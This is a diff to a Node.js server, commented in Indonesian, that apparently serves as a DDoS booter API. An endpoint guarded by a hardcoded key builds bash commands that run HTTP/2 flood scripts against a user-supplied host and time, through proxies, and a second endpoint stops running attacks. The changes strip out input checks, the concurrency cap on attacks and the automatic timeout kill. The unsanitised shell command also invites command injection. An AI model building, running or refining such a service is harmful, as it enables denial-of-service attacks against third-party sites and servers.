@@ -17,13 +17,11 @@ const methods = {
 };
 
 const activeProcesses = new Map();
-const MAX_CONCURRENT_ATTACKS = 10;  // Batas maksimum serangan yang berjalan bersamaan
 
-// Fungsi untuk menghasilkan perintah berdasarkan metode serangan
 const generateCommand = (method, host, port, time) => {
     switch (method) {
         case 'H2FLASH':
-            return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 4 proxy.txt`;
+            return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 2 proxy.txt`;
         case 'H2FLOOD':
             return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
@@ -51,7 +49,6 @@ const generateCommand = (method, host, port, time) => {
     }
 };
 
-// Endpoint umum untuk memulai serangan dengan berbagai metode
 app.get('/api', (req, res) => {
     const key = req.query.key;
     const host = req.query.host;
@@ -59,29 +56,16 @@ app.get('/api', (req, res) => {
     const time = req.query.time;
     const method = req.query.method;
 
-    // Validasi key
     if (key !== 'leance') {
         return res.status(401).json({ error: 'Invalid key' });
     }
 
-    // Validasi metode
     if (!methods[method]) {
         return res.status(400).json({ error: 'Unknown method' });
     }
 
-    // Validasi parameter host, port, dan time
-    if (!host || !port || !time) {
-        return res.status(400).json({ error: 'Missing host, port, or time parameter' });
-    }
-
-    // Memeriksa apakah jumlah serangan yang aktif sudah mencapai batas
-    if (activeProcesses.size >= MAX_CONCURRENT_ATTACKS) {
-        return res.status(429).json({ error: 'Concurrent attack limit reached' }); // HTTP 429: Too Many Requests
-    }
-
-    // Menjalankan serangan berdasarkan metode yang dipilih
     res.json({
-        status: `${method} attack initiated`,
+        status: 'Attack initiated',
         host: host,
         port: port,
         time: time,
@@ -92,32 +76,20 @@ app.get('/api', (req, res) => {
     const process = spawn('bash', ['-c', command], { detached: true });
 
     process.stdout.on('data', (data) => {
-        console.log(`${method} Stdout: ${data}`);
+        console.log(`Stdout: ${data}`);
     });
 
     process.stderr.on('data', (data) => {
-        console.error(`${method} Stderr: ${data}`);
+        console.error(`Stderr: ${data}`);
     });
 
     process.on('close', (code) => {
-        console.log(`${method} Process exited with code ${code}`);
-        activeProcesses.delete(process.pid);  // Menghapus proses dari activeProcesses setelah selesai
+        console.log(`Process exited with code ${code}`);
     });
 
     activeProcesses.set(process.pid, process);
-
-    // Menghentikan serangan otomatis setelah durasi (time) yang diberikan
-    const durationInMs = parseInt(time, 10) * 1000; // Mengonversi durasi dari detik ke milidetik
-    setTimeout(() => {
-        if (activeProcesses.has(process.pid)) {
-            console.log(`${method} timeout reached. Stopping attack.`);
-            process.kill();  // Menghentikan proses setelah timeout
-            activeProcesses.delete(process.pid); // Menghapus proses dari daftar aktif
-        }
-    }, durationInMs); // Durasi yang diberikan dalam milidetik
 });
 
-// Endpoint untuk menghentikan semua serangan yang sedang berjalan
 app.get('/api/stop', (req, res) => {
     const key = req.query.key;
 
@@ -133,7 +105,6 @@ app.get('/api/stop', (req, res) => {
     res.json({ status: 'All attacks stopped.' });
 });
 
-// Menjalankan server pada port yang ditentukan
 app.listen(port, () => {
     console.log(`Server running at http://localhost:${port}`);
 });
